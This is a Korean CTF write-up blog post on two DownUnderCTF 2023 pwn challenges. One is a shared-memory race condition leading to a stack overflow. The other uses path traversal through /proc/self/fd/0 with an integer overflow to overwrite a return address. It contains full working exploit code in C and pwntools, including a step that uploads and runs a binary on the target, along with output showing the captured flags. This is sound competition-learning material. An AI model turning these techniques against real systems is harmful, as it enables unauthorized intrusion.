---
layout: post
title: "DUCTF pwn Write-up"
image: /img/202309/du_00.png
tags: [CTF, write-up, pwnable]
---

# DUCTF pwn Write up

전체적으로 문제의 아이디어가 재밌었습니다. 그 중 포너블 두 문제 라이트업 입니다.  

![](/img/202309/du_01.png)

## shifty mem (255 points / 40 solves)

![](/img/202309/du_02.png)

### Analysis

특이하게도 c 파일이 제공된 문제가 많습니다. 제공된 소스코드를 보며 파악한 기능입니다.

```c
    char* name = argv[1];
    mode_t old_umask = umask(0);
    int fd = shm_open(name, O_CREAT | O_RDWR | O_TRUNC | O_EXCL, S_IRWXU | S_IRWXG | S_IRWXO);
    umask(old_umask);
    if(fd == -1) {
        fprintf(stderr, "shm_open error");
        exit(1);
    }

    if(ftruncate(fd, sizeof(shm_req_t)) == -1) {
        fprintf(stderr, "ftruncate error");
        exit(1);
    }

    shm_req_t* shm_req = mmap(NULL, sizeof(shm_req_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(shm_req == MAP_FAILED) {
        fprintf(stderr, "mmap error");
        exit(1);
    }
```
프로그램 실행시 넘긴 argv[1]이 공유 메모리 객체의 이름이 됩니다. `shm_open`으로 공유 메모리 객체를 생성하는데, `O_CREAT`와 `O_EXCL` 플래그가 함께 설정되어 있으므로 이미 존재하는 공유 메모리 객체에 대해서는 shm_open이 실패하게 되니 주의해야 합니다.  
`ftrucate`로 크기를 조정하고 `mmap`으로 공유 메모리 객체를 현재 프로세스에 매핑합니다.

```c
typedef struct req {
    unsigned char len;
    char shift;
    char buf[MAX_STR_LEN];
} shm_req_t;
```

```c
    shm_req->len = -1;
    shm_req->shift = 0;

    usleep(10000);
    close(fd);
    shm_unlink(name);
```
매핑한 메모리에서 `shm_req`의 멤버 변수를 설정 합니다.  
그 후 `shm_unlink`로 공유메모리 객체를 제거합니다.

```c
#define MAX_STR_LEN 128
```
```c
    char out[MAX_STR_LEN];

    /* shm_open code ... */

    while(1) {
        if(shm_req->len < 0 || shm_req->len > MAX_STR_LEN) {
            continue;
        }

        if(shm_req->len == 0) {
            return 0;
        }

        shift_str(shm_req->buf, shm_req->len, shm_req->shift, out);
        printf("%s", out);
    }
```
shm_req->len은 -1로 초기화 되었기 때문에 `shm_req->len < 0` 조건에 의해 continue 구문을 계속 실행하게 됩니다.  
`shm_req->len == 0` 일 때는 프로그램이 종료됩니다.  
`shm_req->len`에 `MAX_STR_LEN`을 넘지 않는 길이가 설정되면 `shift_str`을 호출합니다. 전달되는 인자는 shm_req의 buf, len, shift, 그리고 결과를 저장할 스택 버퍼 out 입니다.  

```c
void shift_str(char* str, int len, char shift, char out[MAX_STR_LEN]) {
    for(int i = 0; i < len; i++) {
        out[i] = str[i] + shift;
    }
    out[len] = '\0';
}
```
shm_req->buf의 데이터를 shm_req->len 만큼 읽고 각각 shm_req->shift 만큼 값을 더해 out 버퍼에 복사합니다.


### Bug

재미있는 버그입니다🙂

```c
    shm_req->len = -1;
    shm_req->shift = 0;

    usleep(10000);
    close(fd);
    shm_unlink(name);
```
굉장히 수상해 보이는 녀석..  
공유 메모리 객체를 제거하기 전에 10000ms 기다립니다.  
이 사이에 race conditon으로 다른 프로세스에서 같은 공유 메모리 객체를 매핑할 수 있습니다.  
메모리를 공유하기 때문에 shift_mem 프로세스에 사용되는 shm_req 메모리의 값을 컨트롤 할 수 있게 됩니다.  

```c
        if(shm_req->len < 0 || shm_req->len > MAX_STR_LEN) {
            continue;
        }

        if(shm_req->len == 0) {
            return 0;
        }
        shift_str(shm_req->buf, shm_req->len, shm_req->shift, out);
        printf("%s", out);
```
out 버퍼에 stack overflow를 일으키려면 `shm_req->len`이 `MAX_STR_LEN` 보다 커야 합니다.  
여기서도 race condition을 이용해서, 첫 번째 if 문이 실행되는 동안은 shm_req->len을 0~MAX_STR_LEN 사이의 값으로 설정하고, `shift_str` 함수가 호출되기 전에 MAX_STR_LEN 보다 더 큰 값으로 변경합니다.  

PIE가 걸려있지 않고, flag 읽어주는 `win` 함수가 구현되어 있어서 RET를 바꾸는 것으로 간단히 플래그를 획득할 수 있습니다.  

변조한 RET을 실행하기 위해서는 마지막으로 `shm_req->len`을 0으로 설정해서 while문을 탈출해야 합니다.


### Exploit
```c
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define MAX_STR_LEN 128

typedef struct req {
    unsigned char len;
    char shift;
    char buf[MAX_STR_LEN];
} shm_req_t;

int main(int argc, char** argv) {
    char* name = argv[1];
    mode_t old_umask = umask(0);
    int fd = shm_open(name, O_RDWR, 0666);
    umask(old_umask);

    if(fd == -1) {
        fprintf(stderr, "shm_open error");
        exit(1);
    }

    shm_req_t* shm_req = mmap(NULL, sizeof(shm_req_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    printf("%p\n", shm_req);
    if(shm_req == MAP_FAILED) {
        fprintf(stderr, "mmap error");
        exit(1);
    }

    while(shm_req->len != 0xff) {}

    printf("%d %d\n", shm_req->len, shm_req->shift);

    shm_req->len = 0x2;
    shm_req->shift = 0x00;

    usleep(1000);
    memcpy(shm_req->buf, "22223333", 8);
    memcpy(shm_req->buf + 0x88, "\xa6\x12\x40\x00\x00\x00\x00\x00", 0x8);
    memcpy(shm_req->buf + 0xa0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 0x8);
    memcpy(shm_req->buf + 0xa8, "\x4c\x12\x40\x00\x00\x00\x00\x00", 0x8);
    memcpy(shm_req->buf + 0xb0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 0x8);

    for (int i=0; i<100000; i++) {
      shm_req->len = 0x2;
      shm_req->len = 0xff;
    }
    close(fd);
}
```
```python
from pwn import *
import base64
from time import sleep
import sys

def rcv(r, d, f=True):
    data = b''
    while d not in data:
        data += r.recv(1024)
    data = data.split(b'\r')
    data = b''.join(data)
    if f:
      return data.decode()
    else:
      return data

r = remote('pwn-shifty-mem-e2993357bc2bc0d7.2023.ductf.dev', 443, ssl=True)
rr = remote('pwn-shifty-mem-e2993357bc2bc0d7.2023.ductf.dev', 443, ssl=True)

send_f = False
if sys.argv[2] == 't':
    send_f = True

if send_f == True:
  data = open('./aa', 'rb').read()
  data = base64.b64encode(data)

  payload = b''
  payload += b'echo "' + data + b'" > /tmp/aa.bin'
  print(rcv(r, b'$ '))
  r.sendline(payload)

  print(rcv(r, b'$ '))
  r.sendline(b'base64 -d /tmp/aa.bin > /tmp/aa')

  print(rcv(r, b'$ '))
  r.sendline(b'chmod +x /tmp/aa')

print(rcv(r, b'$ '))
r.sendline(b'/home/ctf/chal/shifty_mem ' + sys.argv[1].encode())

sleep(0.01)

rr.sendline(b'/tmp/aa ' + sys.argv[1].encode())

print(rcv(r, b'$ '))

while True:
    ind = input()
    r.sendline(ind.encode())
    print(rcv(r, b'\n', False))
```
```plain
$ python3 ex.py shm f
[+] Opening connection to pwn-shifty-mem-e2993357bc2bc0d7.2023.ductf.dev on port 443: Done
[+] Opening connection to pwn-shifty-mem-e2993357bc2bc0d7.2023.ductf.dev on port 443: Done
bash: cannot set terminal process group (191): Inappropriate ioctl for device
bash: no job control in this shell
ctf@ctf-pwn-shifty-mem-e2993357bc2bc0d7-545b5888f-krm49:/$ 
<d7-545b5888f-krm49:/$ /home/ctf/chal/shifty_mem shm


b'\n\n\n\n\n\n\n\n\n\n\n\n\n'

b'\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'

b'\n'

b'\n\n\n\n\n\n\n\n\n\n\n\n\n'

b'\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'

b'\n\n\n\n\n\n\n\n\n\n\n\n'

b'\n'

b'\n\n\n\n\n\n\n\n22\n22\n22\n22223333\n'

b'DUCTF{r4c1ng_sh4r3d_m3mory_t0_th3_f1nish_flag}\n
```
python에서도 shm_open을 구현할 수 있지만 C 파일로 만들어서 업로드하고 따로 실행하는 방식으로 짰습니다.

## binary mail (291 points / 26 solves)

![](/img/202309/du_03.png)

### Analysis

역시 C 파일이 제공됩니다.
```c
int main() {
    init();
    puts("binary mail v0.1.0");
    taglen_t cmd_tl;
    char tmpbuf[128];

    while(1) {
        read_taglen(stdin, &cmd_tl);
        if(cmd_tl.tag != TAG_COMMAND || cmd_tl.len >= 128) {
            print_tlv(TAG_RES_ERROR, "invalid command");
            continue;
        }
        fread(tmpbuf, 1, cmd_tl.len, stdin);
        if(strncmp(tmpbuf, "register", 8) == 0) {
            register_user();
        }
        if(strncmp(tmpbuf, "view_mail", 9) == 0) {
            view_mail();
        }
        if(strncmp(tmpbuf, "send_mail", 9) == 0) {
            send_mail();
        }
    }
}
```
tag 구조를 통해 컨맨드를 구분하거나 검증합니다.

```c
typedef enum {
    TAG_RES_MSG,
    TAG_RES_ERROR,
    TAG_INPUT_REQ,
    TAG_INPUT_ANS,
    TAG_COMMAND,
    TAG_STR_PASSWORD,
    TAG_STR_FROM,
    TAG_STR_MESSAGE
} tag_t;

typedef struct {
    tag_t tag;
    unsigned long len;
} taglen_t;
```
tag는 operation을 나타내는 4 바이트 tag 값과 읽어들일 버퍼의 길이긴 8 바이트 len 으로 구성되어 있습니다.

```c
void register_user() {
    char tmpbuf[USERPASS_LEN];
    char tmpbuf2[12];
    taglen_t tl;

    print_tlv(TAG_INPUT_REQ, "username");
    read_taglen(stdin, &tl);
    if(tl.tag != TAG_INPUT_ANS || tl.len >= USERPASS_LEN) {
        print_tlv(TAG_RES_ERROR, "invalid username input");
        return;
    }
    fread(tmpbuf, 1, tl.len, stdin);
    tmpbuf[tl.len] = '\0';

    FILE* fp = get_user_save_fp(tmpbuf, "r");
        ...
        /* input password */
        pack_taglen(TAG_STR_PASSWORD, tl.len, tmpbuf2);
        fwrite(tmpbuf2, 1, 12, fp);
        fwrite(tmpbuf, 1, tl.len, fp);
        ...
}
```
```c
FILE* get_user_save_fp(char username[USERPASS_LEN], const char* mode) {
    char fname[USERPASS_LEN + 6];

    snprintf(fname, USERPASS_LEN + 6, "/tmp/%s", username);
    FILE* fp = fopen(fname, mode);

    return fp;
}
```
register_user 기능에서는 username과 password를 입력 받는데, username을 파일명으로 사용해서 거기에 tag 정보(password임을 나타내는 tag 값과 password의 길이)와 password를 기록합니다.  

```c
void send_mail() {
  /*
    input username
    auth check : input password and validate check using handle_auth function
    input recipient
    input message -> write to recipient's file
  */
    ...
    pack_taglen(TAG_STR_MESSAGE, tl.len, tmpbuf2);
    fwrite(tmpbuf2, 1, 12, fp);
    fwrite(tmpbuf, 1, tl.len, fp);
    fflush(fp);

    print_tlv(TAG_RES_MSG, "message sent");
}
```
```c
FILE* handle_auth(char username[USERPASS_LEN]) {
    char tmpbuf[USERPASS_LEN];
    char tmpbuf2[USERPASS_LEN];
    taglen_t tl;

    FILE* fp = get_user_save_fp(username, "r");

    ...
        fread(tmpbuf, 1, tl.len, stdin);
        ...
        fread(tmpbuf2, 1, tl.len, fp);

        if(memcmp(tmpbuf, tmpbuf2, MAX(t1, tl.len)) != 0) {
            print_tlv(TAG_RES_ERROR, "incorrect password");
            return 0;
        }

        return fp;
    }
}
```
코드가 길어서 이것저것 생략했습니다.  
사용자의 username을 입력 받아 해당 파일을 읽고 password를 비교해 검증합니다.  
그 후 누구에게 보낼 것인지 recipient를 입력 받고, message 내용을 입력하면 recipient로 입력한 사용자의 파일에 보낸 사용자와 message 내용을 각각 tag 정보와 함께 기록합니다.

```c
void view_mail() {
    /*
      input username
    */

    FILE* fp = handle_auth(tmpbuf);
    if(fp == 0) return;

    read_taglen(fp, &tl);
    ...
    memcpy(tmpbuf, "from: ", 6);
    fread(tmpbuf + 6, 1, t1, fp);
    tmpbuf[6 + t1] = '\n';

    ...
    memcpy(tmpbuf + 6 + t1 + 1, "message: ", 9);
    fread(tmpbuf + 6 + t1 + 1 + 9, 1, t2, fp);

    pack_taglen(TAG_RES_MSG, t1 + t2 + 16, tmpbuf2);
    fwrite(tmpbuf2, 1, 12, stdout);
    fwrite(tmpbuf, 1, t1 + t2 + 16, stdout);
    fflush(stdout);
}
```
view_mail에서는 username에 해당하는 사용자의 파일에 mail이 있는지 확인하고 누가 보낸것인지와 message 내용을 출력합니다.  
  
모든 입력과 출력 전에는 tag 정보를 통해 길이 검증을 하고 있어서 해당 부분은 모두 생략했습니다.

### Bug
이번에도 재밌었습니다🙂

```c
FILE* get_user_save_fp(char username[USERPASS_LEN], const char* mode) {
    char fname[USERPASS_LEN + 6];

    snprintf(fname, USERPASS_LEN + 6, "/tmp/%s", username);
    FILE* fp = fopen(fname, mode);

    return fp;
}
```
user의 파일을 생성하거나 읽일 때 사용되는 코드입니다. `path traversal`이 가능합니다.  

overflow를 일으키려면 파일에 기록된 tag의 len을 조작 할 수 있어야 하는데 주어진 기능들로는 파일의 내용을 조작할 수 없어 보였습니다.  
하지만 path traversal를 이용해서 stdin으로부터 값을 읽게 한다면 파일로부터 읽어들이는 모든 값을 컨트롤 할 수 있게 됩니다.

예를 들어, username을 `../proc/self/fd/0`으로 입력하면 password 정보를 stdin으로 부터 읽으려고 합니다.  
파일(fp, 여기서는 stdin과 동일)로부터 읽어들이는 password와 사용자(stdin)로부터 읽어들이는 pasword를 비교할텐데 적절한 tag와 함께 같은 password를 두 번 입력하면 인증을 통과하게 됩니다.

```c
    read_taglen(fp, &tl);
    ...
    unsigned long t1 = tl.len;
    if(tl.tag != TAG_STR_FROM || t1 >= USERPASS_LEN) {
        print_tlv(TAG_RES_ERROR, "mail invalid from");
        return;
    }
    memcpy(tmpbuf, "from: ", 6);
    fread(tmpbuf + 6, 1, t1, fp);
    tmpbuf[6 + t1] = '\n';

    read_taglen(fp, &tl);
    unsigned long t2 = tl.len;
    if(tl.tag != TAG_STR_MESSAGE || (t1 + t2) >= USERPASS_LEN + MESSAGE_LEN) {
        print_tlv(TAG_RES_ERROR, "mail invalid message");
        return;
    }
    memcpy(tmpbuf + 6 + t1 + 1, "message: ", 9);
    fread(tmpbuf + 6 + t1 + 1 + 9, 1, t2, fp);

    pack_taglen(TAG_RES_MSG, t1 + t2 + 16, tmpbuf2);
    fwrite(tmpbuf2, 1, 12, stdout);
    fwrite(tmpbuf, 1, t1 + t2 + 16, stdout);
```
조작된 파일을 사용하면 view_mail에서 overflow를 일으킬 수 있습니다.  
파일에서 tag 정보를 읽고, 보낸 사람에 대한 길이 t1과 메세지 내용 길이 t2를 더한 값이 `USERPASS_LEN + MESSAGE_LEN` 보다 크면 안되는데, t1+t2가 8 바이트를 넘어가도록 t2를 큰 값으로 조작해서 `integer overflow`를 발생시키면 검사를 우회할 수 있습니다.
그 후 fp에서 최대 t2 길이 만큼 `tmpbuf + 6 + t1 + 1 + 9`로 데이터를 읽습니다.  
t2가 매우 큰 값으로 조작되었기 때문에 `buffer overflow`가 발생합니다.  

PIE가 걸려있기 때문에 leak을 먼저 해서 코드 영역 주소를 알아내고, 다시 트리거 해서 RET를 flag를 읽어주는 `win`함수 주소로 덮어씌우면 됩니다.

### Exploit

```python
from pwn import *

r = remote('2023.ductf.dev', 30011)

r.recvuntil(b'0\n')

# [1] view mail for leak
print('view_mail')

r.send(p32(4)+p64(9))
r.send(b'view_mail')

# path traversal
print(r.recvuntil(b'username').decode())
r.send(p32(3)+p64(17))
r.send(b'../proc/self/fd/0')

# password check
print(r.recvuntil(b'password').decode())
r.send(p32(3)+p64(1))
r.send(b'\x03')
r.send(p32(5)+p64(1))
r.send(b'\x03')

r.send(p32(6)+p64(127)) # tag str from
r.send(b'a'*127)

r.send(p32(7)+p64(0xffffffffffffffff)) # tag str msg
r.send(b'\x30'*(0x4b0-0x18-0x80-0x10+1)+p32(0x4b8-0x7f)+b'\x00\x00\x00\x00')

r.recvuntil(b'message')
r.recvuntil(b'\x00'*6)

r.recv(8*3)

d = r.recv(8)
d = u64(d)
print(hex(d))

win = d - (0x1ef6 - 0x126e)
print('win : '+hex(win))


# [2] view mail for win
print('view_mail')

r.send(p32(4)+p64(9))
r.send(b'view_mail')

print(r.recvuntil(b'username').decode())
r.send(p32(3)+p64(17))
r.send(b'../proc/self/fd/0')

print(r.recvuntil(b'password').decode())
r.send(p32(3)+p64(1))
r.send(b'\x03')
r.send(p32(5)+p64(1))
r.send(b'\x03')

r.send(p32(6)+p64(127)) # tag str from
r.send(b'a'*127)

r.send(p32(7)+p64(0xffffffffffffffff))
r.send(b'\x30'*(0x4b0-0x18-0x80-0x10+1)+p32(0x5050)+b'\x00\x00\x00\x00'+p64(win)*4)

r.interactive()
```

```plain
% python3 ee.py
[+] Opening connection to 2023.ductf.dev on port 30011: Done
view_mail
\x00\x00\x0\x00\x00\x00\x00\x00\x00\x00username
\x00\x00\x0\x00\x00\x00\x00\x00\x00\x00password
0x55acf3c0cef6
win : 0x55acf3c0c26e
view_mail
view_mai\x00\x00\x0\x00\x00\x00\x00\x00\x00\x00username
\x00\x00\x0\x00\x00\x00\x00\x00\x00\x00password
[*] Switching to interactive mode
\x00\x00\x00\x00\xce\xc1\xf3\xacU\x00\x00DUCTF{y0uv3_g0t_ma1l_and_1ts_4_flag_cada60be8ab71a}
```